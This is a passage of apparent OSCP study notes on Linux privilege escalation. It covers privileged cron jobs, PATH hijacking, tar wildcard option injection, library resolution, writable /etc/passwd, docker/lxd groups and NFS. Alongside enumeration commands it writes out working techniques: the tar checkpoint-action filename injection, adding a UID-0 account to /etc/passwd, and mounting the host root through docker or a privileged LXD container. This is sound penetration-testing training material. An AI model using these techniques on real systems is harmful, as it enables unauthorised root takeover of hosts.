+<h3 id="6-execute-and-choose-variants-7">6. Execute and choose variants</h3>
+<pre><code class="language-bash">crontab -l 2>/dev/null
+cat /etc/crontab
+cat /etc/anacrontab 2>/dev/null
+atq 2>/dev/null
+ls -la /etc/cron.* /var/spool/cron 2>/dev/null
+grep -RniE 'CRON|CMD' /var/log/syslog /var/log/cron* 2>/dev/null | tail -n 100
+
+systemctl list-timers --all
+systemctl list-unit-files --type=service
+systemctl list-units --type=service --state=running
+systemctl cat UNIT
+systemctl show UNIT -p User -p Group -p ExecStart -p WorkingDirectory -p EnvironmentFiles
+</code></pre>
+<p>Observe short-lived commands:</p>
+<pre><code class="language-bash">./pspy64
+./pspy64 -pf -i 1000
+</code></pre>
+<p>Validate every referenced script, binary, configuration, environment file, plugin and parent:</p>
+<pre><code class="language-bash">namei -l /PATH/TO/OBJECT
+stat /PATH/TO/OBJECT /PATH/TO/PARENT
+getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
+</code></pre>
+<blockquote>
+<p><strong>Prove:</strong> exact object is controllable → job/service consumes it → process runs as a higher identity → schedule/restart/other trigger is available. A writable unit still needs a privileged reload/restart or automatic trigger. Cron uses a different/minimal environment.</p>
+</blockquote>
+<p>Apply the same proof to backup, logrotate, package-maintenance and custom housekeeping hooks: configuration visibility or a writable output is insufficient unless a higher-privileged consumer interprets attacker-controlled input.</p>
+<h3 id="7-worked-example--hypothetical-7">7. Worked example — hypothetical</h3>
+<p>Observation: root runs a backup script on a timer. Test: prove the exact script path and effective write rights, then observe a controlled effect at its scheduled trigger. Illustrative output: a root-owned marker appears. Interpretation: privileged consumption is confirmed.</p>
+<h3 id="8-verify-the-result-7">8. Verify the result</h3>
+<p>Verify the consumer's resulting effect and identity; editing a file without an observed trigger is incomplete.</p>
+<h3 id="9-failure-and-fallback-7">9. Failure and fallback</h3>
+<p>Wrong path, service sandbox, missing trigger or another effective identity breaks the chain. Use process observation and permission checks.</p>
+<h3 id="10-next-transitions-7">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-permissions">Prove effective file, directory, ACL and mount control</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-path">Hijack an unqualified helper through controlled PATH resolution</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-wildcard">Turn wildcard-expanded filenames into privileged command options</a>.</p>
+<p><a id="linux-path"></a></p>
+<h2 id="hijack-an-unqualified-helper-through-controlled-path-resolution">Hijack an unqualified helper through controlled PATH resolution</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#7-path-and-relative-command-hijacking">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-8">1. Purpose and result</h3>
+<p>Verified execution of the chosen helper under the consumer identity.</p>
+<h3 id="2-recognition-clues-8">2. Recognition clues</h3>
+<p>A privileged program/job invokes a helper without an absolute path.</p>
+<h4 id="find-the-clue-from-your-starting-access-8">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect a verified privileged helper/script for unqualified executable names and compare its actual PATH with writable directories.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">printf '%s\n' "$PATH"
+namei -l /PATH/TO/CANDIDATE_DIRECTORY
+strings /PATH/TO/REVIEWED_BINARY
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Helper invocation: backup_tool ARGUMENT
+Consumer PATH: /CONTROLLED_DIRECTORY:/usr/bin:/bin
+</code></pre>
+<p><strong>Recognize this detail:</strong> An unqualified helper can resolve through the controlled earlier directory in the consumer's environment.</p>
+<p><strong>Still missing before method selection:</strong> Find the helper name in the privileged script or observed pspy command. Check that it is unqualified and identify the consumer's real PATH; a writable directory matters only if that consumer searches it first.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The consumer selects the controlled helper under the higher identity: use the verified resolution route.</td></tr><tr><td>Ruled out in this context</td><td>It invokes /usr/bin/backup_tool by absolute path or uses a protected PATH: reject this hijack.</td></tr><tr><td>Inconclusive</td><td>A strings result alone does not prove an executed call or inherited PATH; inspect/observe the consumer.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>.</p>
+<h3 id="3-prerequisites-8">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> A controlled directory precedes the real helper in the consumer's effective PATH; execution preserves useful privilege and a trigger exists.</p>
+<h3 id="4-discover-and-verify-prerequisites-8">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">printf '%s\n' "$PATH"
+namei -l /PATH/TO/CANDIDATE_DIRECTORY
+</code></pre>
+<h3 id="5-why-it-works-8">5. Why it works</h3>
+<p>The caller's effective PATH determines helper lookup; changing the attacker's PATH has no effect when the privileged consumer sets its own environment or uses an absolute path.</p>
+<h3 id="6-execute-and-choose-variants-8">6. Execute and choose variants</h3>
+<pre><code class="language-bash">echo "$PATH" | tr ':' '\n'
+echo "$PATH" | tr ':' '\n' | while IFS= read -r d; do
+  [ -z "$d" ] &#x26;&#x26; d=.
+  [ -w "$d" ] &#x26;&#x26; ls -ld "$d"
+done
+strings /PATH/TO/PRIVILEGED_BINARY | grep -E '(^|[^/])(cp|tar|service|sh|bash|cat)( |$)'
+</code></pre>
+<p>If the privileged consumer resolves <code>helper</code> through a controllable PATH:</p>
+<pre><code class="language-bash">printf '#!/bin/sh\n/usr/bin/id > /tmp/path-proof\n' > /WRITABLE/DIR/helper
+chmod 700 /WRITABLE/DIR/helper
+PATH=/WRITABLE/DIR:$PATH /PATH/TO/TRIGGER
+cat /tmp/path-proof
+</code></pre>
+<blockquote>
+<p>Requires a relative command, the consumer's effective PATH, an earlier writable directory, trigger and retained privilege. Your interactive PATH alone is inconclusive.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-8">7. Worked example — hypothetical</h3>
+<p>Observation: a privileged helper invokes a bare command name. Test: inspect the execution environment and create a controlled implementation in the earlier permitted directory. Illustrative output: the triggered program runs the controlled helper as root. Interpretation: resolution and privilege retention are confirmed.</p>
+<h3 id="8-verify-the-result-8">8. Verify the result</h3>
+<p>Prove actual helper selection and effective identity through a controlled effect.</p>
+<h3 id="9-failure-and-fallback-8">9. Failure and fallback</h3>
+<p>secure_path, absolute paths, a changed working directory or privilege dropping can invalidate the route.</p>
+<h3 id="10-next-transitions-8">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-suid">Use a SUID or SGID program's exposed privileged primitive</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<p><a id="linux-wildcard"></a></p>
+<h2 id="turn-wildcard-expanded-filenames-into-privileged-command-options">Turn wildcard-expanded filenames into privileged command options</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#8-wildcard-and-option-injection">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-9">1. Purpose and result</h3>
+<p>A verified unintended privileged utility operation.</p>
+<h3 id="2-recognition-clues-9">2. Recognition clues</h3>
+<p>A privileged job passes an uncontrolled directory glob to an option-parsing utility.</p>
+<h4 id="find-the-clue-from-your-starting-access-9">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Read the exact privileged command line and inspect the directory over which its shell glob expands.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">cat /PATH/TO/REVIEWED_JOB_SCRIPT
+ls -la /PATH/TO/JOB_DIRECTORY
+namei -l /PATH/TO/JOB_DIRECTORY
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Job command: tar ... *
+Working directory: /CONTROLLED_DIRECTORY
+Caller: root
+</code></pre>
+<p><strong>Recognize this detail:</strong> Controlled filenames may become utility arguments after glob expansion; the exact utility and option ordering decide the method.</p>
+<p><strong>Still missing before method selection:</strong> Inspect the exact privileged command: confirm that a wildcard expands attacker-controlled names into option positions and that the utility interprets those options. A writable directory without that command/trigger does not enable this route.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The actual invocation accepts the useful injected option and privileged effect is verified: select that mechanism.</td></tr><tr><td>Ruled out in this context</td><td>The job uses -- before expanded filenames or no compatible glob: reject that option-injection route.</td></tr><tr><td>Inconclusive</td><td>A wildcard-looking string without execution/working-directory evidence is only a candidate.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>.</p>
+<h3 id="3-prerequisites-9">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Control of expanded filenames; compatible option parsing and argument placement; useful program feature and privileged trigger.</p>
+<h3 id="4-discover-and-verify-prerequisites-9">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">namei -l /PATH/TO/JOB_DIRECTORY
+ls -la /PATH/TO/JOB_DIRECTORY
+</code></pre>
+<h3 id="5-why-it-works-9">5. Why it works</h3>
+<p>Shell glob expansion produces arguments before the program parses options. A filename that becomes an option is useful only for a utility/mode that honors it; -- or fixed argument handling can stop the chain.</p>
+<h3 id="6-execute-and-choose-variants-9">6. Execute and choose variants</h3>
+<pre><code class="language-bash">grep -RniE 'tar .+\*|chown .+\*|chmod .+\*|rsync .+\*' \
+  /etc/cron* /etc/systemd /opt /usr/local 2>/dev/null
+</code></pre>
+<p>GNU tar proof, only when a privileged job executes compatible <code>tar ... *</code> in an attacker-writable directory:</p>
+<pre><code class="language-bash">printf '#!/bin/sh\n/usr/bin/id > /tmp/wildcard-proof\n' > proof.sh
+chmod 700 proof.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh proof.sh'
+</code></pre>
+<blockquote>
+<p>Confirm working directory, wildcard placement, utility implementation/options, privileged identity and trigger. Do not assume every wildcard or utility accepts filename-derived options.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-9">7. Worked example — hypothetical</h3>
+<p>Observation: a backup job calls tar on an uncontrolled wildcard. Test: inspect exact command ordering and supported tar options. Illustrative output: controlled filenames select the documented checkpoint action when the job runs. Interpretation: option injection is confirmed.</p>
+<h3 id="8-verify-the-result-9">8. Verify the result</h3>
+<p>Verify the utility's actual triggered effect and its identity, not merely that special filenames exist.</p>
+<h3 id="9-failure-and-fallback-9">9. Failure and fallback</h3>
+<p>A different utility build, -- separator, changed directory or absent glob can disprove this path.</p>
+<h3 id="10-next-transitions-9">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-permissions">Prove effective file, directory, ACL and mount control</a>.</p>
+<p><a id="linux-library"></a></p>
+<h2 id="control-a-privileged-programs-shared-library-resolution">Control a privileged program's shared-library resolution</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#12-shared-library-resolution">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-10">1. Purpose and result</h3>
+<p>Verified privileged initialization or behavior of a controlled shared object.</p>
+<h3 id="2-recognition-clues-10">2. Recognition clues</h3>
+<p>A privileged executable has an unsafe library dependency, RPATH/RUNPATH or plugin path.</p>
+<h4 id="find-the-clue-from-your-starting-access-10">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect the reviewed privileged executable's dependencies/search paths and permission-check the actual selected library directory.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">readelf -d /PATH/TO/BINARY
+namei -l /PATH/TO/LIBRARY_DIRECTORY
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">NEEDED: libAPP.so
+RUNPATH: /CONTROLLED_LIBRARY_DIRECTORY
+</code></pre>
+<p><strong>Recognize this detail:</strong> A named dependency plus a potentially controlled search location is a loader-resolution candidate.</p>
+<p><strong>Still missing before method selection:</strong> Verify actual runtime selection, ABI/symbols, secure-execution rules, retained privilege and a trigger.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The higher-identity process actually loads the controlled compatible library: select that chain.</td></tr><tr><td>Ruled out in this context</td><td>A protected earlier library or secure-loader behavior prevents selection: reject the assumed path.</td></tr><tr><td>Inconclusive</td><td>Static dependency output alone leaves actual privileged resolution unknown.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-suid">Use a SUID or SGID program's exposed privileged primitive</a>.</p>
+<h3 id="3-prerequisites-10">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Actual privileged load from a controlled location, matching ABI/name and required symbols, plus a trigger.</p>
+<h3 id="4-discover-and-verify-prerequisites-10">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">readelf -d /PATH/TO/BINARY
+namei -l /PATH/TO/LIBRARY_DIRECTORY
+file /PATH/TO/BINARY
+</code></pre>
+<h3 id="5-why-it-works-10">5. Why it works</h3>
+<p>The dynamic loader resolves dependencies using context-specific rules. A writable directory is irrelevant if secure execution or an earlier trusted resolution prevents loading from it.</p>
+<h3 id="6-execute-and-choose-variants-10">6. Execute and choose variants</h3>
+<pre><code class="language-bash">file /PATH/TO/BINARY
+readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
+ldd /PATH/TO/BINARY 2>/dev/null
+</code></pre>
+<blockquote>
+<p>Need a privileged dynamically linked consumer plus a missing/selected library resolved from a writable location or a preserved loader variable. Secure-execution mode strips many loader variables from SUID/SGID programs. Prefer <code>readelf</code> over executing an untrusted file through an unsafe <code>ldd</code> implementation.</p>
+</blockquote>
+<p>For root-run scripts, inspect imports/includes and their actual search order. A writable current directory, module path or imported file can be a privileged input even when the main script is protected:</p>
+<pre><code class="language-bash">grep -nE '^(import|from) |require\(|include|source |\. ' /PATH/TO/SCRIPT
+/PATH/TO/python3 -c 'import sys; print("\n".join(sys.path))'
+</code></pre>
+<blockquote>
+<p>Prove the privileged interpreter uses the writable module/include before changing it. The interactive interpreter's search path may differ from cron/systemd/sudo.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-10">7. Worked example — hypothetical</h3>
+<p>Observation: a custom privileged binary references a library in a writable search location. Test: confirm resolution and ABI, then trigger a minimal controlled effect. Illustrative output: library initialization runs under the higher identity. Interpretation: the library-consumption chain is verified.</p>
+<h3 id="8-verify-the-result-10">8. Verify the result</h3>
+<p>Prove the selected library path and effective execution identity; retain dependency and trigger evidence.</p>
+<h3 id="9-failure-and-fallback-10">9. Failure and fallback</h3>
+<p>Static linking, secure-loader sanitization, a different selected library or missing symbols breaks the route.</p>
+<h3 id="10-next-transitions-10">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-preload">Load a controlled library through a permitted sudo environment</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>; <a href="/oscp/notes/methods/public-exploits/#exploit-compile">Compile and minimally adapt an existing native or memory-corruption PoC</a>.</p>
+<p><a id="linux-policy"></a></p>
+<h2 id="change-a-writable-account-or-privilege-policy-file">Change a writable account or privilege-policy file</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#9-writable-accountpolicy-files">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-11">1. Purpose and result</h3>
+<p>A verified account or policy-backed privilege transition.</p>
+<h3 id="2-recognition-clues-11">2. Recognition clues</h3>
+<p>Account metadata or a privilege-policy file appears writable.</p>
+<h4 id="find-the-clue-from-your-starting-access-11">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Check permissions on the account/policy file identified by enumeration, including parents and mount state, before any content change.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">stat /etc/passwd /etc/shadow /etc/sudoers
+getfacl -p /etc/passwd /etc/sudoers 2>/dev/null
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">/etc/passwd: mode=0666 owner=root
+Effective write for current identity: present
+</code></pre>
+<p><strong>Recognize this detail:</strong> A sensitive account file appears writable; the authentication implementation and valid record syntax determine its effect.</p>
+<p><strong>Still missing before method selection:</strong> Preserve original state; confirm exact effective write, file consumer, useful identity and recovery/trigger.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The valid authorized change produces the intended authentication/policy effect: choose this sensitive-file route.</td></tr><tr><td>Ruled out in this context</td><td>The filesystem/ACL denies the required operation: reject the writable-file hypothesis.</td></tr><tr><td>Inconclusive</td><td>Mode bits without ACL/mount/consumer evidence leave a safe usable transition unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-permissions">Prove effective file, directory, ACL and mount control</a>.</p>
+<h3 id="3-prerequisites-11">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Effective write/replace permission, known file syntax and a useful identity/policy consumer; preserve the original.</p>
+<h3 id="4-discover-and-verify-prerequisites-11">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">stat /etc/passwd /etc/shadow /etc/sudoers
+getfacl -p /etc/passwd /etc/sudoers 2>/dev/null
+</code></pre>
+<h3 id="5-why-it-works-11">5. Why it works</h3>
+<p>Sensitive-file write can change authentication or authorization, but the exact file format and consuming implementation determine the effect. A malformed account/policy file can break access.</p>
+<h3 id="6-execute-and-choose-variants-11">6. Execute and choose variants</h3>
+<pre><code class="language-bash">ls -l /etc/passwd /etc/shadow /etc/sudoers
+namei -l /etc/passwd
+getfacl -p /etc/passwd 2>/dev/null
+</code></pre>
+<details>
+<summary><strong>Writable /etc/passwd — authorized disposable lab only</strong></summary>
+<pre><code class="language-bash">cp /etc/passwd /tmp/passwd.backup
+HASH=$(openssl passwd -6 'TEMP_PASSWORD')
+printf 'root2:%s:0:0:root:/root:/bin/bash\n' "$HASH" >> /etc/passwd
+su - root2
+id
+</code></pre>
+<blockquote>
+<p>Preserve a known-good copy and restore it. UID/GID 0 creates a superuser. Do not risk corrupting a host when no safe recovery exists.</p>
+</blockquote>
+</details>
+<p>Also inspect effective access to <code>/etc/sudoers.d</code>, PAM, SSH authorized-key locations and root-executed startup/configuration files.</p>
+<h3 id="7-worked-example--hypothetical-11">7. Worked example — hypothetical</h3>
+<p>Observation: a disposable lab exposes writable account metadata. Test: preserve the original and inspect the authentication implementation before the documented minimal change. Illustrative output: the new context authenticates with the expected UID. Interpretation: verify and restore according to the lab objective.</p>
+<h3 id="8-verify-the-result-11">8. Verify the result</h3>
+<p>Verify the resulting identity/authorized action and retain the exact change plus recovery copy privately.</p>
+<h3 id="9-failure-and-fallback-11">9. Failure and fallback</h3>
+<p>Read-only mounts, PAM behavior or syntax mistakes can defeat the candidate. Prefer a narrower reversible consumer when available.</p>
+<h3 id="10-next-transitions-11">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>; <a href="/oscp/notes/methods/credentials/#credential-use">Validate known passwords and context-specific reuse</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-permissions">Prove effective file, directory, ACL and mount control</a>.</p>
+<p><a id="linux-containers"></a></p>
+<h2 id="use-privileged-group-daemon-or-container-management-control">Use privileged group, daemon or container-management control</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#10-privileged-groups-sockets-and-containers">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-12">1. Purpose and result</h3>
+<p>A verified privileged daemon operation or host-relevant access.</p>
+<h3 id="2-recognition-clues-12">2. Recognition clues</h3>
+<p>Membership or socket ACLs permit controlling a rootful daemon or useful session.</p>
+<h4 id="find-the-clue-from-your-starting-access-12">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect groups, local sockets and namespace context, then use only permitted read-only daemon inventory to identify rootful/rootless behavior.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">id
+ls -l /var/run/docker.sock
+cat /proc/1/cgroup
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">groups include docker
+Socket group: docker; group read/write
+Container/host context: verify separately
+</code></pre>
+<p><strong>Recognize this detail:</strong> Effective socket access suggests daemon control; group text alone does not establish host-affecting rootful operations.</p>
+<p><strong>Still missing before method selection:</strong> Check API acceptance, rootful/rootless and namespace policy, available resources and the specific host operation.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>A rootful daemon permits the required host-affecting operation: use that documented route.</td></tr><tr><td>Ruled out in this context</td><td>A rootless/user-namespaced daemon cannot grant the assumed host-root effect: reject that chain.</td></tr><tr><td>Inconclusive</td><td>Socket presence without usable API permissions leaves the control claim unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<h3 id="3-prerequisites-12">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Effective daemon/API permission, correct rootful/rootless or privileged mode, available resources and a host-affecting operation.</p>
+<h3 id="4-discover-and-verify-prerequisites-12">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">id
+ls -l /var/run/docker.sock
+findmnt
+cat /proc/1/cgroup
+</code></pre>
+<h3 id="5-why-it-works-12">5. Why it works</h3>
+<p>Controlling a rootful container daemon can grant host-mount operations; root inside a restricted/rootless container is a different authority. Socket presence alone proves no API access.</p>
+<h3 id="6-execute-and-choose-variants-12">6. Execute and choose variants</h3>
+<pre><code class="language-bash">id
+ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null
+docker version 2>/dev/null
+lxc list 2>/dev/null
+</code></pre>
+<p>Group candidates include <code>docker</code>, <code>lxd</code>/<code>lxc</code>, <code>disk</code>, <code>shadow</code>, <code>adm</code>, <code>systemd-journal</code> and <code>libvirt</code>. Prove the associated resource and effective permission.</p>
+<details>
+<summary><strong>Rootful Docker daemon with an available image</strong></summary>
+<pre><code class="language-bash">docker images
+docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh
+</code></pre>
+<blockquote>
+<p>Requires daemon/socket access, a rootful daemon, usable image and allowed host bind mount. Rootless mode, user namespaces, authorization plugins and SELinux can change the effect.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>LXD/LXC with an available image alias</strong></summary>
+<pre><code class="language-bash">lxc image list
+lxc init IMAGE_ALIAS privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
+</code></pre>
+<blockquote>
+<p>Requires configured daemon access, sufficient group rights, image availability and privileged-container/device support.</p>
+</blockquote>
+</details>
+<h3 id="7-worked-example--hypothetical-12">7. Worked example — hypothetical</h3>
+<p>Observation: docker group access reaches a rootful daemon. Test: inspect its available image and mount permissions using the documented procedure. Illustrative output: a controlled container can read the intended host filesystem. Interpretation: verify host context before claiming host root.</p>
+<h3 id="8-verify-the-result-12">8. Verify the result</h3>
+<p>Distinguish host and container namespace, effective UID and the exact host operation.</p>
+<h3 id="9-failure-and-fallback-12">9. Failure and fallback</h3>
+<p>Rootless mode, user namespaces, policy or absent images can change the route. Do not equate a container prompt with host compromise.</p>
+<h3 id="10-next-transitions-12">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-secrets">Recover credentials from Linux user, service and process trails</a>; <a href="/oscp/notes/methods/linux-privesc/#linux-mounts">Exploit a permission-backed mount, NFS mapping or local service</a>.</p>
+<p><a id="linux-mounts"></a></p>
+<h2 id="exploit-a-permission-backed-mount-nfs-mapping-or-local-service">Exploit a permission-backed mount, NFS mapping or local service</h2>
+<p><strong>Blocks:</strong> 8. <a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/#11-mounts-nfs-and-local-services">Operational procedure</a> | <a href="/oscp/cheatsheets/linux-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-13">1. Purpose and result</h3>
+<p>A useful file/credential operation or verified local service access.</p>
+<h3 id="2-recognition-clues-13">2. Recognition clues</h3>
+<p>A writable/exported filesystem or a loopback-only service with useful privileges.</p>
+<h4 id="find-the-clue-from-your-starting-access-13">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Inspect mounts, exports and local listeners after the foothold; correlate each with its identity and reachable service.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">findmnt
+cat /etc/exports 2>/dev/null
+ss -lntup
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Listener: 127.0.0.1:DATABASE_PORT
+Export option candidate: no_root_squash
+</code></pre>
+<p><strong>Recognize this detail:</strong> A local-only service or export mapping creates a specific investigation route, not automatic escalation.</p>
+<p><strong>Still missing before method selection:</strong> For the service check accepted identity/rights; for NFS check client mapping, write permissions, mount flags and target-side consumer.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The complete mapped-file or authenticated local-service primitive is verified: select it.</td></tr><tr><td>Ruled out in this context</td><td>root_squash/nosuid or insufficient service rights defeats the proposed privileged chain.</td></tr><tr><td>Inconclusive</td><td>Export text or a listen socket without actual access leaves the candidate incomplete.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/linux-privesc/#linux-state">Establish Linux state and choose an escalation candidate</a>.</p>
+<h3 id="3-prerequisites-13">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Linux foothold with a known effective UID, groups and filesystem context. <strong>Required conditions:</strong> Relevant export/mount options or service authentication; effective identity, writable path and any privileged execution consumer.</p>
+<h3 id="4-discover-and-verify-prerequisites-13">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">findmnt
+cat /etc/exports 2>/dev/null
+ss -lntup
+ss -lxnp
+</code></pre>
+<h3 id="5-why-it-works-13">5. Why it works</h3>
+<p>A new mount or local listener changes reachable objects, not automatically privilege. NFS numeric-ID mapping, squash options and local service rights must be tested in their actual context.</p>
+<h3 id="6-execute-and-choose-variants-13">6. Execute and choose variants</h3>
+<pre><code class="language-bash">findmnt
+cat /etc/fstab
+mount
+ss -lntup
+ss -lxnp
+</code></pre>
+<p>For NFS, a writable export plus <code>no_root_squash</code> can trust client-root-created ownership/SUID metadata. Confirm export options, writable mount, target-side mount options and compatible execution. See <a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS/RPC</a>.</p>
+<p>Root-only loopback services and UNIX sockets are candidates only. Identify protocol/authentication and prove a privileged action through a controlled request, configuration, plugin or file.</p>
+<h3 id="7-worked-example--hypothetical-13">7. Worked example — hypothetical</h3>
